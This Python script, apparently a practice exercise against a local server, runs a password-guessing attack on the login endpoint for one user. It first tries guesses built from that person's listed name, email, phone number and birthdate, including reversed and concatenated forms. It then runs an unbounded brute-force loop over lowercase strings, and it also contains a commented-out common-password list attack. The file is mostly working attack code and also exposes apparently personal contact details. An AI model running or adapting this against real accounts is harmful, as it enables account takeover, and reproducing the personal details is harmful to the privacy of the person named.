import requests

# user info /* alderson3246@gmail.com (933 124 27 65) Mark Alderson (1996 05 18)*/
print('user info')
usr_info = [
    'Eleot164', #461toelT
    'alderson3246@gmail.com', #6423nosredla
    '933 124 27 65',
    'Eleot',
    'Alderson',
    '1996.05.18' #81.50.6991
]
email = ''
for passwd in range(len(usr_info)):
    if passwd == 1:
        mail = usr_info[passwd]
        for l in range(len(mail)):
            char = mail[l]
            if mail[l] == '@':
                break
            email += char
        response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': email})
        if response.status_code == 200:
            print('success', email)
            exit()
        continue
    else:
        response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': usr_info[passwd]})
        if response.status_code == 200:
            print('success', usr_info[passwd])
            exit()
email_rev = ''
passwd_rev = ''
for passwd in range(len(usr_info)):
    if passwd == 1:
        for c in range(len(email)):
            r = c+1
            email_rev += email[-r]
        response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': email_rev})
        if response.status_code == 200:
            print('success', email_rev)
            exit()
        continue
    else:
        passwd_rev = ''
        r = 0
        item = usr_info[passwd]
        for c in range(len(usr_info[passwd])):
            r = c+1
            passwd_rev += item[-r]
        passwd_rev = str(passwd_rev)
        response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': passwd_rev})
        if response.status_code == 200:
            print('success', passwd_rev)
            exit()
comb_mass = []
c = 2
paswd = ''
for j in range(3):
    c += 1
    comb_mass.append(usr_info[c])
paswd = comb_mass[0] + comb_mass[1]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()
paswd = comb_mass[1] + comb_mass[0]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()
paswd = comb_mass[0] + comb_mass[2]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()
paswd = comb_mass[2] + comb_mass[0]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()
paswd = comb_mass[1] + comb_mass[2]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()
paswd = comb_mass[2] + comb_mass[1]
response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': paswd})
if response.status_code == 200:
    print('success', paswd)
    exit()


# print('popular passwords')
# # popular passwords
# with open('popular.txt') as f:
#     passwords = f.read().split('\n')
#
# for password in passwords:
#     response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'Eleot164', 'password': password})
#     if response.status_code == 200:
#         print('SUCCESS', password)
#         exit()


# broute-force
alphabet = 'abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

counter = 0
length = 3

while True:

    # counter -> str at base -> password
    # 1000 == 62 * 16 + 8 == (3 * 16 + 14) * 16 + 8 -> 3(14)8 == 3E8
    password = ''
    number = counter
    while number > 0:
        # number = x * base + rest
        x = number // base
        rest = number % base
        password = alphabet[rest] + password
        number = x
    while len(password) < length:
        password = alphabet[0] + password

    # check password
    print(length, counter, password)
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'Eleot164', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break

    if alphabet[-1] * length == password:
        length += 1
        counter = 0
    else:
        counter += 1

